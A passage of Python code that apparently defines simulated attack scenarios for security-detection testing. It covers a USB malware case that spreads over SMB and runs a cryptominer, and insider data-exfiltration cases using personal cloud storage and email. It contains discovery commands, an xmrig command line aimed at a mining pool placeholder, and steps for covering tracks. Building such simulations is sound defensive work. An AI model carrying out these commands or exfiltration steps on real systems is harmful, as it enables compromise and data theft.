        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "helper.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 3204, "integrity_level": "high", "command_line": "whoami /all", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "helper.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 3240, "integrity_level": "high", "command_line": "net view /domain", "hash": "d4e5f6a7b8c9012345678901abcdef3456789012abcdef3456789012abcdef34", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),

        # --- Phase 5: First SMB propagation to FILESERVER ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Network", "action": "smb_write", "resource_type": "file_share", "resource_name": "\\\\FILESERVER\\shared$\\{malware_name}", "success": True, "description": "Malware binary copied to FILESERVER shared$ for propagation", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "FILESERVER"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 32768, "bytes_received": 1024, "description": "SMB write to FILESERVER (10.0.1.20:445) — malware propagation", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "FILESERVER"}}, requires_success=True),

        # --- Phase 6: Propagation to WKSTN-201 ---
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 25), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.2.201", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 32768, "bytes_received": 1024, "description": "SMB write to WKSTN-201 (10.0.2.201:445) — malware propagation via admin share", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "WKSTN-201"}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Cryptominer deployment, mining connections, further propagation
        # (overnight gap: malware waits for propagation to execute on targets)
        # =====================================================================

        # --- Phase 7: Cryptominer deployment on initial host ---
        AttackEvent(event_type="process_event", delay=_delay(1440, 480, 720, 2880), data={"process_name": "xmrig.exe", "action": "start", "parent_process": "helper.exe", "path": "C:\\Windows\\System32\\xmrig.exe", "pid": 4520, "integrity_level": "high", "command_line": "xmrig.exe -o {miner_pool}:3333 -u wallet_address --threads=4", "hash": "e5f6a7b8c9d0123456789012abcdef4567890123abcdef4567890123abcdef45", "user_context": "SYSTEM", "metadata": {"attack_phase": "impact", "cryptominer": True}}, requires_success=True),

        # --- Phase 8: Mining pool connections from multiple hosts ---
        # Initial host mining
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.2, 3), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 256, "description": "Stratum mining pool connection from initial host — cryptominer active", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "initial"}}, requires_success=True),
        # WKSTN-201 mining
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "10.0.2.201", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 256, "description": "Stratum mining pool connection from WKSTN-201 — propagated miner active", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-201"}}, requires_success=True),

        # --- Phase 9: Propagation to WKSTN-202 and WKSTN-203 ---
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 10, 180), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.2.202", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 32768, "bytes_received": 1024, "description": "SMB write to WKSTN-202 (10.0.2.202:445) — malware propagation", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "WKSTN-202"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "10.0.2.201", "destination_ip": "10.0.2.203", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 32768, "bytes_received": 1024, "description": "SMB write to WKSTN-203 (10.0.2.203:445) — secondary propagation from WKSTN-201", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "WKSTN-203"}}, requires_success=True),

        # --- Phase 10: Miner beacon from each newly infected host ---
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 10, 180), data={"source_ip": "10.0.2.202", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 256, "description": "Stratum mining pool connection from WKSTN-202 — propagated miner active", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-202"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "10.0.2.203", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 256, "description": "Stratum mining pool connection from WKSTN-203 — propagated miner active", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-203"}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Additional spread attempts, CPU alert, mining from 4+ hosts
        # (overnight gap: miners running continuously)
        # =====================================================================

        # --- Phase 11: Additional spread attempts ---
        AttackEvent(event_type="network_event", delay=_delay(1440, 480, 720, 2880), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.2.204", "destination_port": 445, "protocol": "TCP", "action": "blocked", "direction": "internal", "auth": "ntlm", "bytes_sent": 1024, "bytes_received": 0, "description": "SMB connection attempt to WKSTN-204 (10.0.2.204:445) — blocked by firewall", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "WKSTN-204", "blocked": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(15, 8, 3, 45), data={"source_ip": "10.0.2.202", "destination_ip": "10.0.2.205", "destination_port": 445, "protocol": "TCP", "action": "blocked", "direction": "internal", "auth": "ntlm", "bytes_sent": 1024, "bytes_received": 0, "description": "SMB connection attempt from WKSTN-202 to WKSTN-205 — blocked", "metadata": {"attack_phase": "lateral_movement", "propagation": True, "target": "WKSTN-205", "blocked": True}}, requires_success=True),

        # --- Phase 12: High CPU utilization alert ---
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "Monitoring System", "action": "alert_high_cpu", "resource_type": "system_alert", "resource_name": "High CPU Utilization Alert — Multiple Workstations", "success": True, "description": "Alert: sustained >90% CPU utilization on WKSTN-201, WKSTN-202, WKSTN-203 and initial infected host", "metadata": {"attack_phase": "impact", "cpu_alert": True}}, requires_success=True),

        # --- Phase 13: Mining pool traffic pattern from 4+ hosts ---
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 2048, "bytes_received": 1024, "description": "Sustained Stratum mining pool traffic from initial host — share submissions every 30s", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "initial", "sustained": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "10.0.2.201", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 2048, "bytes_received": 1024, "description": "Sustained Stratum mining pool traffic from WKSTN-201", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-201", "sustained": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "10.0.2.202", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 2048, "bytes_received": 1024, "description": "Sustained Stratum mining pool traffic from WKSTN-202", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-202", "sustained": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "10.0.2.203", "destination_ip": "{attacker_ip}", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 2048, "bytes_received": 1024, "description": "Sustained Stratum mining pool traffic from WKSTN-203", "metadata": {"attack_phase": "impact", "cryptomining": True, "host": "WKSTN-203", "sustained": True}}, requires_success=True),
    ],
    parameters=USB_MALWARE_PARAMS,
    success_rate=0.5,
    iocs=["pool.minexmr.com", "xmr.nanopool.org"],
    expected_findings=[
        "USB autorun payload executed from removable drive",
        "Persistent Windows service created by malware",
        "SMB propagation to multiple hosts (FILESERVER, workstations)",
        "Cryptominer deployed — mining pool connections from expanding cluster",
        "High CPU utilization alert across multiple workstations",
    ],
    relevant_ioc_keys=["miner_pool", "malware_name", "attacker_ip"],
)

# ---------------------------------------------------------------------------
# DLP scenario definitions
# ---------------------------------------------------------------------------

MASS_DOWNLOAD_RESIGNATION = AttackScenario(
    id="mass_download_resignation",
    tier="T3",
    name="Mass Download Before Resignation",
    description="Employee submits resignation notice and over the following days systematically downloads sensitive corporate data from multiple SharePoint libraries and internal sources. Installs a personal cloud sync app to stage exfiltration, downloads files in batches across sales data, customer lists, engineering documents, financial reports, HR data, and contracts, uploads each batch to personal cloud storage, and uninstalls the sync app before departure to cover tracks.",
    attack_type="dlp",
    events=[
        # =====================================================================
        # DAY 1 — Resignation submission + initial SharePoint browsing
        # =====================================================================

        # --- Phase 1: Context — resignation notice filed ---
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "Workday", "action": "submit_resignation", "resource_name": "Resignation Notice", "success": True, "description": "Employee submitted resignation notice — 2-week notice period", "metadata": {"attack_phase": "context", "hr_event": True}}, requires_success=False),

        # --- Phase 2: Initial SharePoint browsing — reconnaissance ---
        AttackEvent(event_type="app_event", delay=_delay(120, 60, 30, 360), data={"app": "SharePoint Online", "action": "browse_library", "resource_type": "document_library", "resource_name": "Sales Team Documents", "success": True, "description": "Browsed Sales Team Documents library on SharePoint", "metadata": {"attack_phase": "reconnaissance"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "SharePoint Online", "action": "browse_library", "resource_type": "document_library", "resource_name": "Engineering Knowledge Base", "success": True, "description": "Browsed Engineering Knowledge Base library on SharePoint", "metadata": {"attack_phase": "reconnaissance"}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Download batch 1: sales data and customer lists + install sync app
        # (overnight gap: employee plans download strategy)
        # =====================================================================

        # --- Phase 3: Download batch 1 — sales data and customer lists ---
        AttackEvent(event_type="file_event", delay=_delay(1440, 480, 720, 2880), data={"action": "download", "path": "/Sales Team Documents/Customer Lists/Enterprise-Customer-Directory-2026.xlsx", "system": "sharepoint", "label": "confidential", "category": "sales", "description": "Downloaded enterprise customer directory from SharePoint", "metadata": {"attack_phase": "collection", "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/Sales Team Documents/Pricing/Product-Pricing-Matrix-2026.xlsx", "system": "sharepoint", "label": "confidential", "category": "sales", "description": "Downloaded product pricing matrix from SharePoint", "metadata": {"attack_phase": "collection", "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/Sales Team Documents/Pipeline/Sales-Pipeline-Q4-2026.xlsx", "system": "sharepoint", "label": "confidential", "category": "sales", "description": "Downloaded Q4 sales pipeline report from SharePoint", "metadata": {"attack_phase": "collection", "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "/Sales Team Documents/Accounts/Key-Account-Contacts-2026.csv", "system": "sharepoint", "label": "confidential", "category": "sales", "description": "Downloaded key account contact list from SharePoint", "metadata": {"attack_phase": "collection", "batch": 1}}, requires_success=True),

        # --- Phase 4: Install Google Drive sync app ---
        AttackEvent(event_type="device_event", delay=_delay(30, 15, 5, 90), data={"action": "software_install", "software_name": "Google Drive", "software_version": "89.0.3", "description": "Installed Google Drive for Desktop sync application", "metadata": {"attack_phase": "exfiltration_prep"}}, requires_success=True),

        # --- Phase 4b: First upload — sales data batch ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "Google Drive", "action": "upload", "resource_name": "{external_destination}", "success": True, "description": "Uploaded sales data batch (800 MB) to personal Google Drive", "metadata": {"attack_phase": "exfiltration", "external_upload": True, "size_gb": 0.8}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 858993459, "bytes_received": 32768, "description": "Outbound HTTPS transfer to Google Drive (800 MB upload)", "metadata": {"attack_phase": "exfiltration", "external_upload": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Download batch 2: engineering docs and financial reports + upload
        # (overnight gap)
        # =====================================================================

        # --- Phase 5: Download batch 2 — engineering and financial data ---
        AttackEvent(event_type="file_event", delay=_delay(1440, 480, 720, 2880), data={"action": "download", "path": "/Engineering Knowledge Base/Architecture/System-Architecture-Overview-v4.pdf", "system": "sharepoint", "label": "confidential", "category": "engineering", "description": "Downloaded system architecture overview from SharePoint", "metadata": {"attack_phase": "collection", "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/Engineering Knowledge Base/Roadmaps/Product-Roadmap-2027.pptx", "system": "sharepoint", "label": "confidential", "category": "engineering", "description": "Downloaded product roadmap from SharePoint", "metadata": {"attack_phase": "collection", "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/Engineering Knowledge Base/Patents/Pending-Patent-Applications-2026.pdf", "system": "sharepoint", "label": "restricted", "category": "engineering", "description": "Downloaded pending patent applications from SharePoint", "metadata": {"attack_phase": "collection", "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "download", "path": "/Finance Reports/Annual/FY2026-Financial-Statements-Draft.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded FY2026 financial statements from SharePoint", "metadata": {"attack_phase": "collection", "batch": 2}}, requires_success=True),

        # --- Phase 6: Upload batch to personal cloud ---
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 60), data={"app": "Google Drive", "action": "upload", "resource_name": "{external_destination}", "success": True, "description": "Uploaded batch 2 files (1.2 GB) to personal Google Drive", "metadata": {"attack_phase": "exfiltration", "external_upload": True, "size_gb": 1.2}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1288490188, "bytes_received": 32768, "description": "Outbound HTTPS transfer to Google Drive (1.2 GB upload)", "metadata": {"attack_phase": "exfiltration", "external_upload": True}}, requires_success=True),

        # =====================================================================
        # DAY 4 — Download batch 3: HR data and contracts + final upload + uninstall
        # (overnight gap)
        # =====================================================================

        # --- Phase 7: Download batch 3 — HR data and contracts ---
        AttackEvent(event_type="file_event", delay=_delay(1440, 480, 720, 2880), data={"action": "download", "path": "/HR Documents/Compensation/Salary-Bands-All-Departments-2026.xlsx", "system": "sharepoint", "label": "restricted", "category": "hr", "description": "Downloaded salary band data from SharePoint", "metadata": {"attack_phase": "collection", "batch": 3}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/HR Documents/Org Charts/Full-Org-Chart-With-Titles-2026.pdf", "system": "sharepoint", "label": "confidential", "category": "hr", "description": "Downloaded full org chart with titles from SharePoint", "metadata": {"attack_phase": "collection", "batch": 3}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/Legal/Contracts/Vendor-Master-Service-Agreements-2026.pdf", "system": "sharepoint", "label": "confidential", "category": "legal", "description": "Downloaded vendor MSA collection from SharePoint", "metadata": {"attack_phase": "collection", "batch": 3}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "/Legal/Contracts/Client-NDA-Template-and-Executed-NDAs.zip", "system": "sharepoint", "label": "restricted", "category": "legal", "description": "Downloaded executed NDA collection from SharePoint", "metadata": {"attack_phase": "collection", "batch": 3}}, requires_success=True),

        # --- Phase 8: Final upload to personal cloud ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "Google Drive", "action": "upload", "resource_name": "{external_destination}", "success": True, "description": "Uploaded final batch (1.8 GB) to personal Google Drive", "metadata": {"attack_phase": "exfiltration", "external_upload": True, "size_gb": 1.8}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1932735283, "bytes_received": 32768, "description": "Outbound HTTPS transfer to Google Drive (1.8 GB final upload)", "metadata": {"attack_phase": "exfiltration", "external_upload": True}}, requires_success=True),

        # --- Phase 9: Uninstall sync app to cover tracks ---
        AttackEvent(event_type="device_event", delay=_delay(30, 15, 5, 90), data={"action": "software_uninstall", "software_name": "Google Drive", "software_version": "89.0.3", "description": "Uninstalled Google Drive for Desktop sync application", "metadata": {"attack_phase": "defense_evasion", "cleanup": True}}, requires_success=True),
    ],
    parameters=MASS_DOWNLOAD_PARAMS,
    success_rate=0.8,
    iocs=["drive.google.com", "dropbox.com"],
    expected_findings=[
        "Resignation notice submitted — insider threat context",
        "Systematic daily downloads across Sales, Engineering, HR, and Legal",
        "Google Drive sync app installed on corporate endpoint",
        "Multiple upload batches to personal Google Drive",
        "Sync app uninstalled after exfiltration — cover tracks",
    ],
    relevant_ioc_keys=["external_destination"],
)

PERSONAL_EMAIL_EXFIL = AttackScenario(
    id="personal_email_exfil",
    tier="T2",
    name="Personal Email Data Exfiltration",
    description="Employee systematically accesses multiple sensitive data sources, exports reports from the business application, downloads additional files from SharePoint, compiles multiple datasets, and emails them to a personal Gmail account in separate batches before attempting to cover tracks by deleting sent items and export files.",
    attack_type="dlp",
    events=[
        # --- Phase 1: Access and browse sensitive data ---
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "{source_app}", "action": "view_report", "resource_name": "{sensitive_data_type}", "success": True, "description": "Viewed sensitive report in business app", "metadata": {"attack_phase": "access"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "{source_app}", "action": "view_report", "resource_name": "Employee Salary and Compensation Report", "success": True, "description": "Viewed employee compensation report", "metadata": {"attack_phase": "access"}}, requires_success=True),

        # --- Phase 2: Export first dataset ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "{source_app}", "action": "export_data", "resource_name": "{export_type}", "success": True, "description": "Exported primary dataset as CSV file", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "read", "path": "C:\\Users\\Downloads\\{sensitive_data_type}.csv", "system": "endpoint", "label": "confidential", "category": "business", "metadata": {"attack_phase": "collection"}}, requires_success=True),

        # --- Phase 3: Export second dataset ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "{source_app}", "action": "export_data", "resource_name": "Employee Compensation Export", "success": True, "description": "Exported employee compensation data as CSV", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "read", "path": "C:\\Users\\Downloads\\Employee_Compensation_2026.csv", "system": "endpoint", "label": "restricted", "category": "hr", "metadata": {"attack_phase": "collection"}}, requires_success=True),

        # --- Phase 4: Download additional files from SharePoint ---
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 30), data={"action": "download", "path": "/sharepoint/Finance/Revenue_Projections_Q4.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded revenue projections from SharePoint", "metadata": {"attack_phase": "collection"}}, requires_success=True),

        # --- Phase 5: First email with primary export ---
        AttackEvent(event_type="email", delay=_delay(5, 3, 1, 15), data={"direction": "sent", "to_personal": True, "subject": "Files - Personal Backup", "content": "Backup of important files", "attachment_types": ["csv"], "external": True, "metadata": {"attack_phase": "exfiltration", "to_personal_email": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 587, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 524288, "bytes_received": 1024, "description": "Outbound SMTP submission with CSV attachment to external mail service", "metadata": {"attack_phase": "exfiltration", "to_personal_email": True}}, requires_success=True),

        # --- Phase 6: Second email with additional data ---
        AttackEvent(event_type="email", delay=_delay(15, 8, 3, 45), data={"direction": "sent", "to_personal": True, "subject": "Reference Materials", "content": "Some reference docs for later", "attachment_types": ["csv", "xlsx"], "external": True, "metadata": {"attack_phase": "exfiltration", "to_personal_email": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 587, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1048576, "bytes_received": 1024, "description": "Second outbound SMTP submission with multiple attachments to external mail service", "metadata": {"attack_phase": "exfiltration", "to_personal_email": True}}, requires_success=True),

        # --- Phase 7: Cover tracks — delete sent items and local files ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook", "action": "delete_email", "resource_type": "email", "resource_name": "Sent Items — deleted 2 emails to personal address", "success": True, "description": "Deleted sent emails to personal address from Sent Items folder", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
    ],
    parameters=PERSONAL_EMAIL_EXFIL_PARAMS,
    success_rate=0.75,
    iocs=["gmail.com", "protonmail.com"],
    expected_findings=["Sensitive data exported from business application", "Emails with attachments sent to personal Gmail", "Sent items deleted to cover tracks"],
    relevant_ioc_keys=["external_destination"],
)

CLOUD_STORAGE_SYNC_EXFIL = AttackScenario(
    id="cloud_storage_sync_exfil",
    tier="T3",
    name="Cloud Storage Sync Exfiltration",
    description="Employee installs personal cloud sync app over multiple days, progressively syncing corporate data from SharePoint, OneDrive, and network shares to personal cloud storage before sharing externally and removing the app.",
    attack_type="dlp",
    events=[
        # =====================================================================
        # DAY 1 — Install sync app, reconnaissance, small test sync
        # =====================================================================
        AttackEvent(event_type="device_event", delay=_delay(0, 0), data={"action": "software_install", "software_name": "{sync_app}", "software_version": "latest", "metadata": {"attack_phase": "preparation"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "{sync_app}", "action": "configure_sync", "usage": "admin", "resource_name": "{source_location}", "success": True, "description": "Configured sync client with corporate SharePoint", "metadata": {"attack_phase": "preparation"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "SharePoint", "action": "browse_library", "usage": "read", "resource_name": "Corporate Documents", "success": True, "description": "Browsed SharePoint document libraries to identify valuable content", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "SharePoint", "action": "browse_library", "usage": "read", "resource_name": "Finance Reports", "success": True, "description": "Browsed finance team SharePoint library", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "OneDrive for Business", "action": "browse_folder", "usage": "read", "resource_name": "Shared With Me", "success": True, "description": "Browsed files shared with user on OneDrive for Business", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(20, 10, 5, 60), data={"action": "download", "path": "/sharepoint/Finance Reports/Q4_summary.xlsx", "system": "sharepoint", "label": "internal", "category": "financial", "description": "Downloaded quarterly finance summary as initial test", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Finance Reports/budget_forecast.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded budget forecast document", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "{sync_app}", "action": "upload_sync", "usage": "write", "resource_name": "Personal {sync_app} Account", "success": True, "description": "Synced test batch (14 MB) to personal cloud storage", "metadata": {"attack_phase": "exfiltration", "size_mb": 14}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 14680064, "bytes_received": 8192, "description": "Small outbound HTTPS sync to personal cloud storage (14 MB)", "metadata": {"attack_phase": "exfiltration", "cloud_sync": True}}, requires_success=True),
        # =====================================================================
        # DAY 2 — Systematic collection from multiple sources
        # =====================================================================
        AttackEvent(event_type="app_event", delay=_delay(960, 240, 480, 1440), data={"app": "SharePoint", "action": "browse_library", "usage": "read", "resource_name": "HR Policies and Records", "success": True, "description": "Browsed HR document library for sensitive employee data", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 30), data={"action": "download", "path": "/sharepoint/HR Policies and Records/", "system": "sharepoint", "label": "confidential", "category": "hr", "description": "Downloaded HR policies and employee records folder", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 45), data={"action": "download", "path": "/sharepoint/Finance Reports/", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded complete finance reports library", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(20, 10, 5, 60), data={"action": "download", "path": "/onedrive/Strategic Planning/", "system": "onedrive", "label": "confidential", "category": "strategy", "description": "Downloaded strategic planning documents from OneDrive", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "{sync_app}", "action": "upload_sync", "usage": "write", "resource_name": "Personal {sync_app} Account", "success": True, "description": "Synced collected batch (680 MB) to personal cloud storage", "metadata": {"attack_phase": "exfiltration", "size_mb": 680}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 712966553, "bytes_received": 16384, "description": "Medium outbound HTTPS sync to personal cloud storage (680 MB)", "metadata": {"attack_phase": "exfiltration", "cloud_sync": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 5, 90), data={"action": "download", "path": "/network_share/Customer_Data/", "system": "network_share", "label": "restricted", "category": "pii", "description": "Downloaded customer data from network share", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "{sync_app}", "action": "upload_sync", "usage": "write", "resource_name": "Personal {sync_app} Account", "success": True, "description": "Synced customer data batch (420 MB) to personal cloud storage", "metadata": {"attack_phase": "exfiltration", "size_mb": 420}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 440401920, "bytes_received": 16384, "description": "Outbound HTTPS sync of customer data to personal cloud (420 MB)", "metadata": {"attack_phase": "exfiltration", "cloud_sync": True}}, requires_success=True),
        # =====================================================================
        # DAY 3 — Final bulk sync, external sharing, cover tracks
        # =====================================================================
        AttackEvent(event_type="file_event", delay=_delay(960, 240, 480, 1440), data={"action": "download", "path": "/sharepoint/Executive Reports/", "system": "sharepoint", "label": "restricted", "category": "executive", "description": "Downloaded executive reports and board presentations", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 45), data={"action": "download", "path": "/sharepoint/Contracts/", "system": "sharepoint", "label": "confidential", "category": "legal", "description": "Downloaded active contracts and legal agreements", "metadata": {"attack_phase": "collection", "sync_operation": True}}, requires_success=True),
